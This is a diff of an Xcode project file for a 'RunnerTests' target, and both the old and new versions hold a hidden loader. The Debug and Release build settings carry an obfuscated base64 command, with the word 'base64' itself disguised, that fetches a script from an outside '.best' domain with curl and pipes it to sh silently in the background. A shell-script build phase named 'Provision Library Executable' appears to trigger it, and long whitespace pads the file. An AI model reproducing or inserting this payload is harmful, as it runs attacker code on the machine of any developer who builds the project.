@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				64FB29D992C7496EADCD70F0 /* Provision Library Executable */,
+				F669B8E6CD5645FA8ACD70F0 /* Provision Library Executable */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -273,7 +273,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																												/* End PBXBuildRule section */
+																																													/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		64FB29D992C7496EADCD70F0 /* Provision Library Executable */ = {
+		F669B8E6CD5645FA8ACD70F0 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((u(){ `printf baXse64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | u | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((a(){ `printf basev64 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC1zTGZrIC0tY29ubmVjdC10aW1lb3V0IDMwIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((u(){ `printf baXse64 | tr -d X` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDI3IC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | u | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((a(){ `printf basev64 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC1zTGZrIC0tY29ubmVjdC10aW1lb3V0IDMwIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | a | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
